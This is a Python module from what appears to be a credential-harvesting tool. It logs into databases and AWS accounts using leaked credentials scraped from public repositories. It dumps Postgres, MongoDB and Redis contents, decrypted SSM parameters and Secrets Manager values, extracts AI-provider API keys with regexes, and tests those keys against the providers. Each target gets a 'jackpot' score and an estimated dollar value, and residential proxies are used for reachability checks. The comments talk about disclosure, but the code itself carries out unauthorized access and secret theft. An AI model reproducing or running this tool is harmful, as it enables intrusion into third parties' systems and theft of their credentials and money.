"""
Active jackpot-probe for validated infra credentials.

For each is_validated=1 row in infra_findings, attempt to authenticate against
the actual service and inventory what's behind it — specifically searching
for AI-provider API keys stored INSIDE the infrastructure (in DB rows,
SSM Parameter Store, Secrets Manager, blob storage). These keys are NOT in
the public repo and are usually high-balance production keys belonging to
the owner.

Probes implemented:
  postgres  →  list tables, sample suspicious ones, regex AI-keys in values
  mongo     →  list collections, sample, regex
  redis     →  SCAN for token-shaped keys, GET, regex
  aws       →  SSM:DescribeParameters + SecretsManager:ListSecrets +
               GetSecretValue on first 30, regex AI-keys

Evomi SOCKS5 fallback:
  When direct TCP fails (connection refused / timeout / DNS), retry the
  TCP handshake via Evomi proxy with country rotation (US, DE).
  ⚠️ Only the bare TCP check goes via proxy — the actual DB/SDK protocol
  uses direct connection only (proxying postgres-wire/mongo-wire/etc via
  SOCKS5 is fragile across libraries and not worth the complexity).
  Validated-via-proxy creds get connect_route='proxy:XX' and we skip the
  jackpot probe (needs direct DB-protocol).

Output (per row, stored to infra_findings.jackpot_data as JSON):
  {
    "probe_type": "postgres",
    "connect_route": "direct" | "proxy:US",
    "schemas_count": 4,
    "tables_count": 87,
    "suspicious_tables": ["users", "api_keys", "secrets"],
    "ai_keys_found": {"openai": 3, "anthropic": 1, "google": 12},
    "ai_keys_total": 16,
    "previews": ["sk-proj-abc...xyz", "sk-ant-api03-de...123", ...],
    "score": 87,
  }
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse

log = logging.getLogger(__name__)


# ── Key patterns to scan inside infra ────────────────────────────────────────
# Reuse the highest-confidence prefix-only patterns from patterns.py so we
# don't pull in the full extractor pipeline (which needs context anchors that
# don't exist in raw DB rows).
_KEY_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r'sk-proj-[A-Za-z0-9_\-]{40,220}'),       'openai'),
    (re.compile(r'sk-svcacct-[A-Za-z0-9_\-]{40,220}'),    'openai'),
    (re.compile(r'sk-admin-[A-Za-z0-9_\-]{100,200}'),     'openai'),
    (re.compile(r'sk-ant-api03-[A-Za-z0-9_\-]{90,130}'),  'anthropic'),
    (re.compile(r'sk-or-v1-[a-f0-9]{64}'),                'openrouter'),
    (re.compile(r'AIzaSy[A-Za-z0-9_\-]{33}'),             'google'),
    (re.compile(r'(?<![A-Za-z0-9])csk-[a-f0-9]{40}'),     'cerebras'),
    (re.compile(r'(?<![A-Za-z0-9_])gsk_[A-Za-z0-9]{50,60}'), 'groq'),
    (re.compile(r'(?<![A-Za-z0-9_])hf_[A-Za-z0-9]{34,50}'), 'huggingface'),
    (re.compile(r'(?<![A-Za-z0-9_\-])xai-[A-Za-z0-9]{60,90}'), 'grok'),
    (re.compile(r'(?<![A-Za-z0-9])pplx-[a-f0-9]{48,64}'), 'perplexity'),
    (re.compile(r'(?<![A-Za-z0-9_])r8_[A-Za-z0-9]{35,55}'), 'replicate'),
    (re.compile(r'(?<![A-Za-z0-9_])fw_[A-Za-z0-9]{30,60}'), 'fireworks'),
    (re.compile(r'(?<![A-Za-z0-9_])tlk_[A-Za-z0-9]{20,40}'), 'twelvelabs'),
    # legacy OpenAI / Stability collision — flagged as "openai_or_stability"
    (re.compile(r'(?<![A-Za-z0-9])sk-[A-Za-z0-9]{48}(?![A-Za-z0-9])'), 'sk48_ambiguous'),
]

# Suspicious table/collection name patterns — heightened priority for sampling.
_SUSPICIOUS_NAME = re.compile(
    r'(?:^|_)(?:user|users|account|accounts|api_?key|api_?token|secret|secrets'
    r'|token|tokens|credential|credentials|oauth|webhook|integration|env'
    r'|config|configuration|setting|connection|provider)s?(?:$|_)',
    re.IGNORECASE,
)

# Generic-table caps (broad sampling) and suspicious-table caps (deep sampling).
_GENERIC_TABLE_LIMIT     = 10
_SUSPICIOUS_TABLE_LIMIT  = 100
_TOTAL_TABLES_TO_SCAN    = 50    # cap per DB to bound probe time


def _scan_text(text: str) -> tuple[dict[str, int], list[str], dict[str, list[str]]]:
    """Run all patterns over text.
    Returns (counts_per_provider, masked_previews_for_storage, raw_keys_per_provider).
    raw_keys_per_provider is capped at 20 per provider to bound downstream
    validation cost; the masked previews remain for safe storage."""
    counts: dict[str, int] = {}
    previews: list[str] = []
    raw: dict[str, list[str]] = {}
    seen: set[str] = set()
    for pat, prov in _KEY_PATTERNS:
        for m in pat.finditer(text or ""):
            k = m.group(0)
            if k in seen:
                continue
            seen.add(k)
            counts[prov] = counts.get(prov, 0) + 1
            if len(raw.get(prov, [])) < 20:
                raw.setdefault(prov, []).append(k)
            if len(previews) < 10:
                if len(k) > 24:
                    previews.append(f"{k[:12]}...{k[-6:]}")
                else:
                    previews.append(k[:8] + "...")
    return counts, previews, raw


# ── Financial-exposure estimate (typical paid-tier monthly spend per key) ──
# Numbers are conservative averages of leaked-key research from 2024-2026:
# we don't claim per-key exact balance (would require auth into each), but
# this gives the disclosure recipient a credible "if these are production
# keys you're looking at $X/mo unauthorized usage" framing.
_KEY_VALUE_USD: dict[str, int] = {
    "openai":              400,   # paid-tier prod default; sk-proj-/sk-svcacct- often higher
    "sk48_ambiguous":      300,   # legacy openai or stability — split between
    "anthropic":           500,   # claude-opus prod usage
    "google":              100,   # gemini paid; free tier has hard quota
    "openrouter":          200,
    "cerebras":            150,
    "deepseek":             80,
    "groq":                 50,
    "huggingface":          80,
    "grok":                150,
    "perplexity":           50,
    "replicate":           100,
    "fireworks":            80,
    "twelvelabs":          120,
}


def _estimate_exposure_usd(validated_counts: dict[str, int]) -> int:
    return sum(_KEY_VALUE_USD.get(p, 50) * n for p, n in validated_counts.items())


async def _validate_discovered_keys(raw: dict[str, list[str]]) -> dict[str, int]:
    """Run each discovered key through its validator. Returns counts of
    is_valid=1 per provider. Capped at 10 per provider to bound time —
    if there are 30 OpenAI keys in a prod DB, validating 10 is enough to
    establish "this DB really does host live production keys"."""
    if not raw:
        return {}
    try:
        from validators import VALIDATORS
    except Exception as e:
        log.debug("validators import failed: %s", e)
        return {}

    sem = asyncio.Semaphore(10)
    counts: dict[str, int] = {}

    async def _check(prov: str, key: str):
        # Validator name resolution — handle ambiguous prefix
        prov_for_validator = prov
        if prov == "sk48_ambiguous":
            prov_for_validator = "openai"   # try openai first; the stability path is rare
        v = VALIDATORS.get(prov_for_validator)
        if not v:
            return
        async with sem:
            try:
                ok = await asyncio.wait_for(v(key), timeout=15)
                if ok:
                    counts[prov] = counts.get(prov, 0) + 1
            except Exception:
                pass

    tasks = []
    for prov, keys in raw.items():
        for k in keys[:10]:
            tasks.append(_check(prov, k))
    await asyncio.gather(*tasks, return_exceptions=True)
    return counts


def _build_report_summary(data: dict) -> str:
    """One-line human-readable summary for disclosure preparation."""
    keys = data.get("ai_keys_total", 0)
    valid = data.get("ai_keys_total_valid", 0)
    exposure = data.get("estimated_exposure_usd", 0)
    susp = data.get("suspicious_tables", [])
    probe = data.get("probe_type", "?")
    if keys == 0:
        return f"{probe}: достижим, AI-ключи внутри не обнаружены"
    parts = [f"{probe}: {keys} AI-ключ(а) внутри"]
    if valid:
        parts.append(f"{valid} валидных")
    if exposure:
        parts.append(f"~${exposure}/мес потенциал")
    if susp:
        parts.append(f"таблиц подозр.: {len(susp)}")
    return ", ".join(parts)


def _compute_jackpot_score(probe_type: str, data: dict) -> int:
    """0-100 — probability that this infra hosts live, financially-meaningful
    AI keys. Validated keys dominate; raw counts only contribute when no
    validation took place.

    Tiers we want:
      ≥80   "JACKPOT" — multiple validated keys + production indicators
      60-79 "high"    — at least one validated key OR many raw + susp tables
      40-59 "medium"  — raw keys present but none validated
      <40   noise / metadata only
    """
    score = 0
    valid = data.get("ai_keys_total_valid", 0)
    raw   = data.get("ai_keys_total", 0)
    if valid > 0:
        score += min(60, 30 + valid * 10)         # +40..+60 based on count
    elif raw > 0:
        score += min(35, 5 + raw * 3)             # raw-only = lower ceiling
    if data.get("suspicious_tables"):
        score += min(20, 5 * len(data["suspicious_tables"]))
    # Production indicators
    text_blob = (
        " ".join(data.get("suspicious_tables", []))
        + " " + " ".join(data.get("databases", []))
    ).lower()
    for kw, w in [("production", 15), ("prod", 10), ("live", 8), ("public", 5)]:
        if kw in text_blob:
            score += w
            break
    # Very large data volume = serious infra
    cnt = data.get("tables_count") or data.get("collections_count") or data.get("ssm_params") or 0
    if cnt > 100:
        score += 5
    # Cloud-native indicators
    if data.get("ssm_params", 0) > 0 or data.get("sm_secrets", 0) > 0:
        score += 5
    return max(0, min(100, score))


# ── Evomi HTTP-CONNECT proxy helper (TCP tunnel) ─────────────────────────────
# User's Railway env exposes EVOMI_PROXY in HTTP format:
#   http://USER:PASS_country-XX@core-residential.evomi.com:1000
# Country rotation is done by substituting the _country-XX suffix in USER.
# python-socks transparently supports HTTP CONNECT via proxy_type='http'.

import re as _re_jp
_COUNTRY_SUFFIX = _re_jp.compile(r'_country-[A-Za-z]{2}')


def _evomi_url_for_country(country: str) -> str | None:
    """Rebuild EVOMI_PROXY url with the requested country suffix.
    Returns None if EVOMI_PROXY is not configured."""
    from config import EVOMI_PROXY, EVOMI_USER, EVOMI_PASS
    if EVOMI_PROXY:
        if _COUNTRY_SUFFIX.search(EVOMI_PROXY):
            return _COUNTRY_SUFFIX.sub(f"_country-{country.upper()}", EVOMI_PROXY)
        # No country suffix in URL — inject before @
        # Format: scheme://user:pass@host → scheme://user_country-XX:pass@host
        m = _re_jp.match(r"^(\w+://)([^:]+):([^@]+)@(.+)$", EVOMI_PROXY)
        if m:
            return f"{m.group(1)}{m.group(2)}_country-{country.upper()}:{m.group(3)}@{m.group(4)}"
        return EVOMI_PROXY
    if EVOMI_USER and EVOMI_PASS:
        return f"http://{EVOMI_USER}_country-{country.upper()}:{EVOMI_PASS}@core-residential.evomi.com:1000"
    return None


async def _tcp_via_proxy(host: str, port: int, country: str,
                         timeout: float = 10.0) -> bool:
    """Probe TCP reachability via Evomi HTTP-CONNECT proxy from given country."""
    try:
        from python_socks.async_.asyncio import Proxy
    except ImportError:
        log.warning("python_socks not installed — proxy fallback disabled")
        return False

    url = _evomi_url_for_country(country)
    if not url:
        return False

    try:
        proxy = Proxy.from_url(url)
        sock = await asyncio.wait_for(
            proxy.connect(dest_host=host, dest_port=port, timeout=timeout),
            timeout=timeout + 2,
        )
        sock.close()
        return True
    except Exception as e:
        log.debug("evomi proxy probe %s:%d via %s: %s", host, port, country, e)
        return False


async def _direct_tcp(host: str, port: int, timeout: float = 6.0) -> bool:
    try:
        _, w = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        return True
    except Exception:
        return False


async def reachability_check(host: str, port: int) -> tuple[bool, str]:
    """Returns (reachable, route_label).
    route_label ∈ {'direct', 'proxy:US', 'proxy:DE', ''}"""
    if await _direct_tcp(host, port):
        return True, "direct"
    for cc in ("US", "DE"):
        if await _tcp_via_proxy(host, port, cc):
            return True, f"proxy:{cc}"
    return False, ""


# ── Postgres probe ──────────────────────────────────────────────────────────

async def probe_postgres(cred: str) -> dict:
    """
    Connect via asyncpg, list schemas/tables, sample suspicious ones,
    regex-scan for AI keys.
    """
    try:
        import asyncpg
    except ImportError:
        return {"error": "asyncpg_missing"}

    parsed = urlparse(cred)
    host = parsed.hostname
    if not host:
        return {"error": "no_host"}

    out: dict[str, Any] = {
        "probe_type": "postgres",
        "schemas_count": 0,
        "tables_count": 0,
        "suspicious_tables": [],
        "databases": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }

    try:
        # asyncpg accepts the full URI directly; normalize the scheme so
        # postgres+asyncpg:// -> postgres://
        clean = re.sub(r"^postgres(?:ql)?\+\w+://", "postgresql://", cred)
        clean = re.sub(r"^postgres://", "postgresql://", clean)
        conn = await asyncio.wait_for(
            asyncpg.connect(clean, timeout=8, command_timeout=10),
            timeout=12,
        )
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        # List schemas
        schemas = await conn.fetch(
            "SELECT schema_name FROM information_schema.schemata "
            "WHERE schema_name NOT IN ('pg_catalog','information_schema','pg_toast') "
            "AND schema_name NOT LIKE 'pg_temp%'"
        )
        out["schemas_count"] = len(schemas)

        # List tables across all non-system schemas
        tables = await conn.fetch(
            "SELECT table_schema, table_name FROM information_schema.tables "
            "WHERE table_type='BASE TABLE' AND table_schema NOT IN "
            "('pg_catalog','information_schema','pg_toast') "
            "ORDER BY table_schema, table_name"
        )
        out["tables_count"] = len(tables)

        # Pick suspicious tables first, then fill with generic up to cap
        ranked = sorted(
            tables,
            key=lambda r: 0 if _SUSPICIOUS_NAME.search(r["table_name"]) else 1,
        )[:_TOTAL_TABLES_TO_SCAN]
        suspicious_names: list[str] = []

        all_text = []
        for r in ranked:
            tname = f'"{r["table_schema"]}"."{r["table_name"]}"'
            is_susp = bool(_SUSPICIOUS_NAME.search(r["table_name"]))
            limit = _SUSPICIOUS_TABLE_LIMIT if is_susp else _GENERIC_TABLE_LIMIT
            if is_susp:
                suspicious_names.append(f"{r['table_schema']}.{r['table_name']}")
            try:
                rows = await asyncio.wait_for(
                    conn.fetch(f"SELECT * FROM {tname} LIMIT {limit}"),
                    timeout=8,
                )
            except Exception:
                continue
            for row in rows:
                # Stringify all column values
                for v in row.values():
                    if v is None:
                        continue
                    s = str(v)
                    if len(s) > 4 and len(s) < 4096:
                        all_text.append(s)

        out["suspicious_tables"] = suspicious_names[:30]
        text = "\n".join(all_text)
        counts, previews, raw = _scan_text(text)
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        # Validate first 10 of each provider — establish "live keys exist"
        validated = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)

    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            await conn.close()
        except Exception:
            pass

    return out


# ── MongoDB probe ───────────────────────────────────────────────────────────

async def probe_mongo(cred: str) -> dict:
    try:
        import motor.motor_asyncio
    except ImportError:
        return {"error": "motor_missing"}

    out: dict[str, Any] = {
        "probe_type": "mongo",
        "databases": [],
        "collections_count": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    try:
        client = motor.motor_asyncio.AsyncIOMotorClient(
            cred, serverSelectionTimeoutMS=8000, connectTimeoutMS=8000,
        )
        db_names = await asyncio.wait_for(
            client.list_database_names(), timeout=10
        )
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        # Skip system DBs
        target_dbs = [d for d in db_names if d not in ("admin", "config", "local")]
        out["databases"] = target_dbs[:30]

        all_text = []
        suspicious = []
        scanned = 0
        for dbn in target_dbs:
            if scanned >= _TOTAL_TABLES_TO_SCAN:
                break
            db = client[dbn]
            colls = await db.list_collection_names()
            out["collections_count"] += len(colls)
            ranked = sorted(
                colls, key=lambda c: 0 if _SUSPICIOUS_NAME.search(c) else 1
            )
            for c in ranked:
                if scanned >= _TOTAL_TABLES_TO_SCAN:
                    break
                is_susp = bool(_SUSPICIOUS_NAME.search(c))
                limit = _SUSPICIOUS_TABLE_LIMIT if is_susp else _GENERIC_TABLE_LIMIT
                if is_susp:
                    suspicious.append(f"{dbn}.{c}")
                try:
                    docs = await db[c].find({}).limit(limit).to_list(limit)
                except Exception:
                    continue
                for doc in docs:
                    all_text.append(json.dumps(doc, default=str))
                scanned += 1

        out["suspicious_tables"] = suspicious[:30]
        counts, previews, raw = _scan_text("\n".join(all_text))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        validated = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            client.close()
        except Exception:
            pass
    return out


# ── Redis probe ─────────────────────────────────────────────────────────────

async def probe_redis(cred: str) -> dict:
    try:
        import redis.asyncio as aioredis
    except ImportError:
        return {"error": "redis_missing"}

    out: dict[str, Any] = {
        "probe_type": "redis",
        "key_count": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    try:
        client = aioredis.from_url(cred, decode_responses=True,
                                    socket_connect_timeout=8,
                                    socket_timeout=8)
        info = await asyncio.wait_for(client.info("keyspace"), timeout=10)
        # info is dict like {'db0': {'keys': 123, ...}}
        total = sum(d.get("keys", 0) for d in info.values()
                    if isinstance(d, dict))
        out["key_count"] = total
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        # SCAN with MATCH for suspicious key patterns. Limit scan time.
        all_text = []
        susp_keys = []
        deadline = asyncio.get_event_loop().time() + 30  # 30s budget
        for pattern in (
            "*token*", "*secret*", "*key*", "*api*", "*credential*",
            "*oauth*", "*openai*", "*anthropic*", "*ai_*",
        ):
            if asyncio.get_event_loop().time() > deadline:
                break
            try:
                async for k in client.scan_iter(match=pattern, count=200):
                    if asyncio.get_event_loop().time() > deadline:
                        break
                    if len(susp_keys) >= 200:
                        break
                    susp_keys.append(k)
            except Exception:
                continue

        out["suspicious_tables"] = susp_keys[:30]

        # Read values
        for k in susp_keys[:200]:
            try:
                v = await client.get(k)
                if v:
                    all_text.append(str(v))
                    all_text.append(str(k))
            except Exception:
                # Might be hash/list/set; try those
                try:
                    t = await client.type(k)
                    if t == "hash":
                        h = await client.hgetall(k)
                        all_text.append(json.dumps(h, default=str))
                    elif t == "list":
                        lst = await client.lrange(k, 0, 50)
                        all_text.extend(str(x) for x in lst)
                except Exception:
                    pass

        counts, previews, raw = _scan_text("\n".join(all_text))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        validated = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            await client.aclose()
        except Exception:
            pass
    return out


# ── AWS probe (SSM Parameter Store + Secrets Manager) ───────────────────────

async def probe_aws(cred: str) -> dict:
    try:
        import boto3
        from botocore.exceptions import ClientError
    except ImportError:
        return {"error": "boto3_missing"}

    # cred format from extract_aws is roughly "AKIA...:secret@maybe-region"
    # But not all rows are normalized. Be defensive.
    m = re.match(r"^(AKIA[A-Z0-9]+|ASIA[A-Z0-9]+|AKIAJ[A-Z0-9]+):([^@]+)", cred)
    if not m:
        return {"error": "format"}
    kid, secret = m.group(1), m.group(2)
    if len(secret) < 20:
        return {"error": "format"}

    out: dict[str, Any] = {
        "probe_type": "aws",
        "ssm_params": 0,
        "sm_secrets": 0,
        "s3_buckets": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }

    def _do_sync():
        client_sts = boto3.client("sts", aws_access_key_id=kid,
                                  aws_secret_access_key=secret,
                                  region_name="us-east-1")
        try:
            ident = client_sts.get_caller_identity()
        except ClientError as e:
            code = e.response.get("Error", {}).get("Code", "")
            if code in ("InvalidClientTokenId",):
                return {"error": "invalid_token"}
            # SignatureDoesNotMatch / AccessDenied means key is real
            return {"error": "auth_partial", "code": code}

        out["account"] = ident.get("Account", "")[:20]
        out["arn"]     = ident.get("Arn", "")[:80]

        text_blob: list[str] = []
        susp: list[str] = []

        for region in ("us-east-1", "us-west-2", "eu-west-1"):
            try:
                ssm = boto3.client("ssm", aws_access_key_id=kid,
                                    aws_secret_access_key=secret,
                                    region_name=region)
                count = 0
                for page in ssm.get_paginator("describe_parameters").paginate(
                    PaginationConfig={"MaxItems": 200}
                ):
                    for p in page.get("Parameters", []):
                        count += 1
                        name = p.get("Name", "")
                        if _SUSPICIOUS_NAME.search(name):
                            susp.append(f"ssm[{region}]:{name}")
                            try:
                                val = ssm.get_parameter(Name=name, WithDecryption=True)
                                v = val.get("Parameter", {}).get("Value", "")
                                if v:
                                    text_blob.append(v)
                            except ClientError:
                                pass
                out["ssm_params"] += count
            except ClientError:
                pass

            try:
                sm = boto3.client("secretsmanager", aws_access_key_id=kid,
                                   aws_secret_access_key=secret,
                                   region_name=region)
                count = 0
                for page in sm.get_paginator("list_secrets").paginate(
                    PaginationConfig={"MaxItems": 100}
                ):
                    for s in page.get("SecretList", []):
                        count += 1
                        name = s.get("Name", "")
                        susp.append(f"sm[{region}]:{name}")
                        try:
                            val = sm.get_secret_value(SecretId=s["ARN"])
                            v = val.get("SecretString", "")
                            if v:
                                text_blob.append(v)
                        except ClientError:
                            pass
                out["sm_secrets"] += count
            except ClientError:
                pass

        try:
            s3 = boto3.client("s3", aws_access_key_id=kid,
                                aws_secret_access_key=secret)
            buckets = s3.list_buckets().get("Buckets", [])
            out["s3_buckets"] = len(buckets)
            for b in buckets[:20]:
                bn = b.get("Name", "")
                if any(k in bn.lower() for k in ("secret", "env", "config", "prod")):
                    susp.append(f"s3:{bn}")
        except ClientError:
            pass

        out["suspicious_tables"] = susp[:30]
        counts, previews, raw = _scan_text("\n".join(text_blob))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        out["_raw_keys"] = raw  # transient — consumed below for validation
        return out

    try:
        result = await asyncio.to_thread(_do_sync)
        if isinstance(result, dict) and "_raw_keys" in result:
            raw = result.pop("_raw_keys")
            validated = await _validate_discovered_keys(raw)
            result["ai_keys_validated"] = validated
            result["ai_keys_total_valid"] = sum(validated.values())
            result["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
        return result
    except Exception as e:
        return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}


# ── Dispatcher ──────────────────────────────────────────────────────────────

async def probe_one(cred_type: str, cred: str) -> dict:
    """Returns probe result. Adds reachability_check + connect_route on top."""
    # Reachability + route detection (uses Evomi fallback)
    parsed = None
    try:
        parsed = urlparse(cred) if "://" in cred else None
    except Exception:
        parsed = None

    route = ""
    if parsed and parsed.hostname:
        port = parsed.port or _default_port(parsed.scheme)
        ok, route = await reachability_check(parsed.hostname, port)
        if not ok:
            return {"error": "unreachable", "connect_route": ""}
        if route.startswith("proxy:"):
            # Skip jackpot probe — we'd need DB-protocol-aware proxy
            return {"connect_route": route, "skipped": "proxy_only"}

    if cred_type == "database":
        # Pick by scheme
        scheme = (parsed.scheme if parsed else "").split("+")[0].lower()
        if scheme.startswith("postgres"):
            data = await probe_postgres(cred)
        elif scheme in ("mongodb", "mongodb+srv"):
            data = await probe_mongo(cred)
        elif scheme.startswith("redis"):
            data = await probe_redis(cred)
        elif scheme in ("mysql", "mariadb"):
            data = {"probe_type": scheme, "skipped": "mysql_not_implemented"}
        else:
            data = {"probe_type": scheme, "skipped": "unsupported_scheme"}
    elif cred_type == "aws":
        data = await probe_aws(cred)
    else:
        data = {"probe_type": cred_type, "skipped": "type_not_implemented"}

    data["connect_route"] = route or "direct"
    if "score" not in data and "error" not in data:
        data["score"] = _compute_jackpot_score(data.get("probe_type", ""), data)
    return data


def _default_port(scheme: str) -> int:
    s = (scheme or "").lower().split("+")[0]
    return {
        "postgres": 5432, "postgresql": 5432,
        "mongodb": 27017, "mongodb+srv": 27017,
        "redis": 6379, "rediss": 6380,
        "mysql": 3306, "mariadb": 3306,
    }.get(s, 5432)


# ── Cycle runner ────────────────────────────────────────────────────────────

async def run_jackpot_cycle(limit: int | None = None) -> dict:
    """Probe every is_validated=1 row in infra_findings. Updates jackpot_data,
    jackpot_score, connect_route columns. Returns aggregate counts.

    Concurrency capped so we don't hammer one DB host with 50 simultaneous
    connections (some servers throttle aggressively)."""
    import sqlite3
    import db as _dbmod
    from config import DB_PATH

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    where = "is_validated=1"
    rows = conn.execute(
        f"SELECT id, cred_type, cred_full, repo, file_url FROM infra_findings "
        f"WHERE {where} ORDER BY id DESC"
        + (f" LIMIT {int(limit)}" if limit else "")
    ).fetchall()
    conn.close()

    log.info("jackpot: probing %d validated infra rows", len(rows))
    sem = asyncio.Semaphore(10)
    results: dict[int, dict] = {}

    async def _one(r):
        async with sem:
            try:
                d = await probe_one(r["cred_type"], r["cred_full"] or "")
            except Exception as e:
                d = {"error": f"probe_crash:{type(e).__name__}", "msg": str(e)[:120]}
            results[r["id"]] = d

    await asyncio.gather(*(_one(r) for r in rows), return_exceptions=True)

    # Aggregate + write back
    counters = {
        "total": len(rows),
        "probed": 0,
        "errors": 0,
        "via_proxy": 0,
        "with_keys": 0,
        "with_validated_keys": 0,
        "total_keys_found": 0,
        "total_validated_keys": 0,
        "total_estimated_exposure_usd": 0,
        "by_provider": {},
        "by_provider_validated": {},
        "jackpot_critical": 0,   # score >= 60 → top disclosure targets
        "jackpot_severe":   0,   # score >= 80 → JACKPOT-tier
    }
    conn = sqlite3.connect(DB_PATH)
    try:
        for row_id, data in results.items():
            if "error" in data and data["error"] not in ("auth_partial",):
                counters["errors"] += 1
                continue
            counters["probed"] += 1
            route = data.get("connect_route", "")
            if route.startswith("proxy:"):
                counters["via_proxy"] += 1
            keys_found = data.get("ai_keys_total", 0)
            keys_valid = data.get("ai_keys_total_valid", 0)
            if keys_found > 0:
                counters["with_keys"] += 1
                counters["total_keys_found"] += keys_found
                for prov, n in (data.get("ai_keys_found") or {}).items():
                    counters["by_provider"][prov] = (
                        counters["by_provider"].get(prov, 0) + n
                    )
            if keys_valid > 0:
                counters["with_validated_keys"] += 1
                counters["total_validated_keys"] += keys_valid
                for prov, n in (data.get("ai_keys_validated") or {}).items():
                    counters["by_provider_validated"][prov] = (
                        counters["by_provider_validated"].get(prov, 0) + n
                    )
                counters["total_estimated_exposure_usd"] += int(
                    data.get("estimated_exposure_usd", 0) or 0
                )
            # Recompute score with the populated validated counts
            data["score"] = _compute_jackpot_score(data.get("probe_type", ""), data)
            data["report_summary"] = _build_report_summary(data)
            score = data["score"]
            if score >= 60:
                counters["jackpot_critical"] += 1
            if score >= 80:
                counters["jackpot_severe"] += 1
            conn.execute(
                "UPDATE infra_findings SET jackpot_data=?, jackpot_score=?, "
                "connect_route=? WHERE id=?",
                (json.dumps(data, ensure_ascii=False, default=str)[:12000],
                 score, route, row_id),
            )
        conn.commit()
    finally:
        conn.close()

    log.info("jackpot cycle done: %s", counters)
    return counters
